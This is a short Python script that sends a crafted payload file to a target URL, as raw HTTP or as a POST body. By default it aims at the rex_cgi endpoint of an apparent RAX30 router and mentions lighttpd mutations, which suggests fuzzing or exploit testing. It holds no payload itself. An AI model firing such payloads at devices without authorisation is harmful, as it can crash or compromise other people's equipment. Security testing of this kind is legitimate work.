#!/usr/bin/env python3
import sys
import requests
import os
from pathlib import Path

def main():
    if len(sys.argv) < 3:
        print("Usage: generic_payload.py <url> <payload_file>")
        sys.exit(1)
        
    url = sys.argv[1]
    payload_file = sys.argv[2]
    
    if not os.path.exists(payload_file):
        print(f"File not found: {payload_file}")
        sys.exit(1)
        
    with open(payload_file, 'rb') as f:
        payload = f.read()
        
    print(f"[*] Sending payload ({len(payload)} bytes) to {url}")
    
    # Heuristic: Detection of CGI vs Home Page
    # If the payload starts with GET or POST, we might need special handling,
    # but for most 'read' mutations in lighttpd, it's the raw request body or full request.
    
    try:
        # Try as POST first (most CGI interaction)
        # Verify if payload is already a full HTTP request
        if payload.startswith(b"POST") or payload.startswith(b"GET"):
            import socket
            from urllib.parse import urlparse
            
            u = urlparse(url)
            host = u.hostname
            port = u.port or 80
            
            print(f"[*] Detected full HTTP request, using raw socket to {host}:{port}")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect((host, port))
                s.sendall(payload)
                # Read response until timeout or closure
                response = b""
                try:
                    while True:
                        chunk = s.recv(4096)
                        if not chunk: break
                        response += chunk
                except socket.timeout:
                    pass
                print(f"[+] Raw Response length: {len(response)}")
        else:
            # Assume it's a payload for rex_cgi or similar
            # Try to hit a common CGI endpoint if the URL is just the base
            target_url = url
            if url.endswith("/") or ":9090" in url:
                # For RAX30, rex_cgi is the main target
                target_url = f"{url.rstrip('/')}/cgi-bin/rex_cgi"
            
            print(f"[*] Sending to {target_url}...")
            resp = requests.post(target_url, data=payload, timeout=10)
            print(f"[+] Status: {resp.status_code}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
